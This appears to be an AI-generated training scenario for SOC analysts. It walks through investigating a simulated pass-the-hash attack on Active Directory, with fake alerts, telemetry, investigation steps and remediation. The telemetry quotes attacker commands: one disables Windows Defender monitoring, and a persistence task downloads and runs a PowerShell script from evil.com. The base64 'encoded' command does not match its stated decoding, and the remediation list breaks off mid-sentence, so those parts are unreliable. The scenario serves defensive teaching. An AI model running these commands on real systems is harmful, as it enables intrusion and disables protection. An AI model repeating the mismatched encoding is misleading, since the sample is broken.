---
Owner: Chris Adams
title: Pass-the-Hash
type: Simulated Scenario
topic: active-directory
summary: SOC has received alerts of unusual Active Directory activity. Review to see the investigation process.
date: 2024-11-12
tags:
  - ai-generated
  - active-directory
  - cyber-scenarios
publish: 
goal: Investigate how attacker accessed the hashes, determine scope, and steps to prevent further movement.
---
> [!Important] Important!
> This is a fake scenario generated by AI and is meant solely for educational purposes. 
### **Scenario: Pass-the-Hash Attack on Active Directory**

#### **Background:**
It‚Äôs early Monday morning, and the SOC has started receiving alerts indicating unusual activity within the Active Directory environment. The alerts trace back to a low-privilege user account, `ITSupport01`, which doesn‚Äôt normally have access to sensitive systems. Security logs show suspicious logins to multiple critical servers with this account, and there are signs that NTLM hashes are being used in place of passwords, suggesting a pass-the-hash attack.

Your job is to investigate how the attacker accessed the hashes, determine the scope of the compromise, and take steps to prevent further movement.

<div class="neon-line"></div>

#### **Alert Summary:**

1. **Suspicious Authentication Method Using NTLM Hash (PtH)**  
   Type: Authentication Alert  
   Source: `ITSupport01` on `IT-WKS02`  
   Description: The `ITSupport01` account is authenticating with NTLM hashes rather than using a normal password. Suspicious logins appear across several servers, including `FILE-SRV01`, `DB-SRV02`, and the domain controller `DC-01`.

2. **Unusual Remote PowerShell Activity on Critical Servers**  
   Type: Endpoint Execution Alert  
   Source: `DB-SRV02`, `FILE-SRV01`  
   Description: A PowerShell session was initiated remotely using the `ITSupport01` account on both servers. Commands appear to be gathering information and attempting to disable security monitoring.

3. **Lateral Movement Attempt Detected on Endpoints (SMB Lateral Movement)**  
   Type: Network Behavior Anomaly  
   Source: `IT-WKS02`, `FILE-SRV01`  
   Description: High levels of SMB traffic are originating from `IT-WKS02` to `FILE-SRV01` and `DB-SRV02`. Traffic patterns suggest attempted file enumeration and potential data exfiltration.

4. **Unauthorized Scheduled Task Creation on Domain Controller (DC-01)**  
   Type: Endpoint Monitoring Alert  
   Source: `DC-01`  
   Description: A scheduled task named `SystemCheck` was created on `DC-01` under the `ITSupport01` account. It is set to run a PowerShell script every 4 hours, which could indicate persistence.

<div class="neon-line"></div>

### **Objective:**
Determine how the attacker obtained the NTLM hash for `ITSupport01`, assess the scope of lateral movement, and mitigate the pass-the-hash attack. Identify if the attacker has established persistence and recommend containment measures.

<div class="neon-line"></div>

### **Fake Telemetry Details and Logs**

#### **Alert 1: Suspicious Authentication Method Using NTLM Hash (PtH)**

**Telemetry Data (Authentication Logs):**
- **Source Host**: `IT-WKS02`
- **Target Hosts**: `FILE-SRV01`, `DB-SRV02`, `DC-01`
- **Event Timeline**:
  - **2:00 AM** - `ITSupport01` authenticates to `FILE-SRV01` using NTLM hash.
  - **2:05 AM** - `ITSupport01` authenticates to `DB-SRV02` using NTLM hash.
  - **2:10 AM** - `ITSupport01` authenticates to `DC-01` using NTLM hash.

**Analysis:**  
The use of an NTLM hash for authentication indicates a pass-the-hash attack. The attacker is likely moving laterally across high-value servers to escalate privileges or locate sensitive data.

<div class="neon-line"></div>

#### **Alert 2: Unusual Remote PowerShell Activity on Critical Servers**

**Telemetry Data (PowerShell Commands):**
- **Source Account**: `ITSupport01`
- **Commands Executed**:
  - `Get-Process | Where-Object {$_.Name -eq 'winlogon'}` ‚Äî Attempts to enumerate processes, potentially looking for security tools.
  - `Set-MpPreference -DisableRealtimeMonitoring $true` ‚Äî Attempt to disable Windows Defender on `DB-SRV02`.
  - `Invoke-Expression -Command "Get-ADUser -Filter *"` ‚Äî Enumerates Active Directory users.

**Analysis:**  
The attacker is using PowerShell to conduct reconnaissance, attempt to disable security defenses, and gather AD information, likely to prepare for additional privilege escalation or persistence.

<div class="neon-line"></div>

#### **Alert 3: Lateral Movement Attempt Detected on Endpoints (SMB Traffic)**

**Telemetry Data (SMB Traffic Analysis):**
- **Source Hosts**: `IT-WKS02`, `FILE-SRV01`
- **Destination Hosts**: `FILE-SRV01`, `DB-SRV02`
- **Traffic Analysis**:
  - Multiple file enumeration commands were executed, including accessing shared directories on `FILE-SRV01` and `DB-SRV02`.
  - Files with extensions like `.xlsx`, `.docx`, and `.pdf` were accessed repeatedly, suggesting attempts to locate sensitive data.

**Analysis:**  
High SMB traffic volumes from `IT-WKS02` to file servers indicate lateral movement using SMB, a known technique for file exploration and data collection.

<div class="neon-line"></div>

#### **Alert 4: Unauthorized Scheduled Task Creation on Domain Controller (DC-01)**

**Telemetry Data (Scheduled Task Creation):**
- **Scheduled Task Name**: `SystemCheck`
- **Command**:
  ```shell
  powershell.exe -enc JABxPSdodHRwOi8vZXZpbC5jb20vbWFsaWNpb3VzLnBzMXInOyBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAnJGEn
  ```
  - **Decoded Command**:
    ```shell
    Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://evil.com/malicious.ps1')
    ```
- **Execution Interval**: Every 4 hours

**Analysis:**  
The scheduled task indicates a persistence mechanism designed to call an external PowerShell script every few hours. This allows the attacker to regain access even if the initial compromise is remediated.

<div class="neon-line"></div>

### **Investigation Steps**

This is a structured investigation flow for a comprehensive analysis of the incident.

#### **Step 1: Trace the Source of the NTLM Hash Compromise**

- **Identify How the Hash Was Obtained**:
  - Review `IT-WKS02` event logs to identify if the `ITSupport01` hash was cached or if there were any processes that captured credential hashes (e.g., through tools like Mimikatz).
  - Check for suspicious processes running on `IT-WKS02` and review security logs for any credential-dumping attempts.

#### **Step 2: Validate the Pass-the-Hash Attack**

- **Examine Authentication Logs Across Key Systems**:
  - Correlate NTLM logins from `IT-WKS02` to `FILE-SRV01`, `DB-SRV02`, and `DC-01`. Confirm if NTLM authentication patterns align with a PtH attack.
  - Determine if the compromised account (`ITSupport01`) has recent password reset events or unauthorized access to privileged accounts.

- **Check for High-Value Account Access Attempts**:
  - Investigate if `ITSupport01` attempted access to other privileged accounts or AD administrator accounts, which might suggest further escalation.

#### **Step 3: Analyze Remote PowerShell Commands and Scheduled Task on DC-01**

- **Evaluate Remote PowerShell Commands on `DB-SRV02` and `FILE-SRV01`**:
  - Check PowerShell logs on `DB-SRV02` and `FILE-SRV01` to identify the extent of enumeration or disabling security tools.
  - Cross-reference commands with known reconnaissance and persistence techniques.

- **Assess Scheduled Task on `DC-01`**:
  - Review the task configuration and command, confirming its function and purpose.
  - Check for other scheduled tasks or registry modifications on `DC-01` that could indicate persistence.

#### **Step 4: Confirm Lateral Movement Attempts via SMB**

- **Correlate SMB Traffic and File Access Patterns**:
  - Examine file access logs on `FILE-SRV01` and `DB-SRV02` to determine if sensitive files were accessed or exfiltrated.
  - Review firewall and IDS/IPS logs for large or unusual outbound traffic, which could indicate data exfiltration attempts.

#### **Step 5: Determine Extent of AD Compromise and Containment Steps**

- **Identify Indicators of Persistence**:
  - Verify if other accounts were modified or added to privileged groups.
  - Review AD event logs for any new, unauthorized admin accounts or shadow administrators created.

- **Establish Immediate Containment and Quarantine**:
  - Isolate `IT-WKS02` and `FILE-SRV01` from the network to prevent further lateral movement.
  - Reset the `ITSupport01` account password and implement temporary block rules for the hash-based authentication method if feasible.

<div class="neon-line"></div>

### **Containment and Remediation Actions**

1. **Immediate Actions**:
   - **Isolate Affected Endpoints** (`IT-WKS02`, `FILE-SRV01`, and `DB-SRV02`) to prevent further unauthorized access.
   - **Disable the Scheduled Task on DC-01**: Remove `SystemCheck` scheduled task to prevent re-execution of the malicious PowerShell script.

2. **Remediation**:
   - **Reset Passwords and Clear Cached Credentials**: Reset the passwords for all accounts accessed by `ITSupport01` and clear cached credentials across endpoints.
   - **Purge Cached NTLM Hashes**: For affected hosts, clear cached credentials to prevent reuse of


<div class="neon-line"></div>

Thanks for taking the time to read through my content. If you enjoy this type of content, check back here for more updates. 

Peace ‚úåÔ∏è

#### Created on: Nov 12, 2024
---
<div style="text-align: center;">
	<div class="gradient-text">üëæ 2024 rabb1th0les (Chris A)dams üëæ</div> 
	üå¥‚òÄThanks for supporting my page ‚òÄüå¥
	<nav>
		<ul style="list-style: none; padding: 0;">
			<div style="text-align: center;">
				<li><a href="index.html">Home</a> | <a href="Contact.html">Contact</a></li>
			</div>
		</ul>
	</nav>	
</div>